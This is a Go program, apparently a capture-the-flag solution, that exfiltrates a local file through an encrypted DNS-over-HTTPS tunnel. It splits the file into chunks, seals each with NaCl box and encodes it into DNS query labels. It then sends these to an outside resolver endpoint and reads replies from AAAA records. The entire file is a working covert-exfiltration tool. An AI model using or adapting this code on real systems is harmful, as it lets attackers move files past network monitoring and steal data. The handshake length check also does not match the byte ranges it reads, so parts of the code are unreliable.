package main

import (
	"bytes"
	"crypto/rand"
	"encoding/base32"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"sort"
	"time"

	"github.com/miekg/dns"
	"golang.org/x/crypto/nacl/box"
	"lukechampine.com/blake3"
)

const (
	dohServerURL = "https://target-exfil.chals.io/dns-query?"
	chunkSize    = 124
	blockSize    = 56
)

var encoding = base32.NewEncoding("0123456789abcdefghijklmnopqrstuv").WithPadding(base32.NoPadding)

func main() {
	filePath := flag.String("file", "upload_file.bin", "Path to the file to exfiltrate")
	flag.Parse()

	// 1. Initialize Keys
	pub, priv, err := box.GenerateKey(rand.Reader)
	if err != nil {
		log.Fatalf("[-] Key generation failed: %v", err)
	}

	// 2. Protocol Handshake
	fmt.Println("[*] Starting handshake...")
	session, sharedKey, err := performHandshake(pub, priv)
	if err != nil {
		log.Fatalf("[-] Handshake failed: %v", err)
	}
	fmt.Printf("[+] Session established: %x\n", session)

	// 3. Prepare File Data
	content, err := os.ReadFile(*filePath)
	if err != nil {
		log.Fatalf("[-] Could not read file: %v", err)
	}

	fileLen := uint32(len(content))
	numChunks := uint32((len(content) + chunkSize - 1) / chunkSize)
	hash := blake3.Sum512(content)

	// 4. Send Metadata (Chunk 0)
	metaData := make([]byte, 40)
	binary.BigEndian.PutUint32(metaData[0:4], fileLen)
	binary.BigEndian.PutUint32(metaData[4:8], numChunks)
	copy(metaData[8:40], hash[:])

	fmt.Println("[*] Sending metadata (Chunk 0)...")
	sendEncryptedChunk(session, sharedKey, metaData, 0)

	// 5. Exfiltrate Data
	var finalResponse bytes.Buffer
	for i := uint32(0); i < numChunks; i++ {
		start := i * chunkSize
		end := start + chunkSize
		if end > fileLen {
			end = fileLen
		}

		fmt.Printf("\r[*] Progress: %d/%d chunks sent", i+1, numChunks)
		decryptedResp := sendEncryptedChunk(session, sharedKey, content[start:end], i+1)
		finalResponse.Write(decryptedResp)
	}

	fmt.Println("\n[+] Exfiltration complete.")
	os.WriteFile("result_bin.txt", finalResponse.Bytes(), 0644)
}

func performHandshake(pub, priv *[32]byte) ([]byte, *[32]byte, error) {
	pubStr := encoding.EncodeToString(pub[:])
	body := dohRequest(pubStr)
	
	encrypted := extractFromDNSResponse(body)
	if len(encrypted) < 56 {
		return nil, nil, fmt.Errorf("handshake response too short")
	}

	// The handshake response contains the server's public key (32) and a nonce (24)
	var serverPub [32]byte
	var nonce [24]byte
	copy(serverPub[:], encrypted[15:47])
	copy(nonce[:], encrypted[47:71])

	var sharedKey [32]byte
	box.Precompute(&sharedKey, &serverPub, priv)

	decrypted, ok := box.OpenAfterPrecomputation(nil, encrypted[71:], &nonce, &sharedKey)
	if !ok {
		return nil, nil, fmt.Errorf("failed to decrypt handshake")
	}

	return decrypted, &sharedKey, nil
}

func sendEncryptedChunk(session []byte, sharedKey *[32]byte, data []byte, seq uint32) []byte {
	// Construct Nonce: Session Prefix (7) + Padding (13) + Sequence (4)
	nonce := [24]byte{}
	copy(nonce[:], session[:7])
	binary.BigEndian.PutUint32(nonce[20:], seq)

	encrypted := box.SealAfterPrecomputation(nil, data, &nonce, sharedKey)
	boxStr := encoding.EncodeToString(encrypted)

	// DNS Label Formatting
	var dnsLabels string
	for i := 0; i < 4; i++ {
		start := i * blockSize
		if start >= len(boxStr) {
			dnsLabels += "z."
		} else {
			end := start + blockSize
			if end > len(boxStr) {
				end = len(boxStr)
			}
			dnsLabels += boxStr[start:end] + "."
		}
	}

	query := fmt.Sprintf("%s%.8x.%s.xfl.tn", dnsLabels, seq, encoding.EncodeToString(session[:7]))
	respBody := dohRequest(query)
	
	rawResponse := extractFromDNSResponse(respBody)
	
	// Decrypt response using server's nonce construction
	respNonce := [24]byte{}
	copy(respNonce[:], session[:7])
	if len(rawResponse) >= 15 {
		copy(respNonce[9:], rawResponse[:15])
		decrypted, ok := box.OpenAfterPrecomputation(nil, rawResponse[15:], &respNonce, sharedKey)
		if ok {
			return decrypted
		}
	}
	return nil
}

func dohRequest(domain string) []byte {
	msg := new(dns.Msg)
	msg.SetQuestion(dns.Fqdn(domain), dns.TypeA)
	packed, _ := msg.Pack()

	req, _ := http.NewRequest("POST", dohServerURL, bytes.NewReader(packed))
	req.Header.Set("Content-Type", "application/dns-message")

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	return body
}

func extractFromDNSResponse(body []byte) []byte {
	msg := new(dns.Msg)
	if err := msg.Unpack(body); err != nil {
		return nil
	}

	var fragments [][]byte
	for _, ans := range msg.Answer {
		if aaaa, ok := ans.(*dns.AAAA); ok {
			fragments = append(fragments, aaaa.AAAA.To16())
		}
	}

	// Sort fragments by the index byte (usually the first byte of the IPv6 addr)
	sort.Slice(fragments, func(i, j int) bool {
		return fragments[i][0] < fragments[j][0]
	})

	var result []byte
	for i, f := range fragments {
		if i == len(fragments)-1 {
			// Handle the last fragment (remove padding/null bytes)
			zIdx := bytes.IndexByte(f[1:], 0)
			if zIdx != -1 {
				result = append(result, f[1:zIdx+1]...)
				break
			}
		}
		result = append(result, f[1:]...)
	}
	return result
}
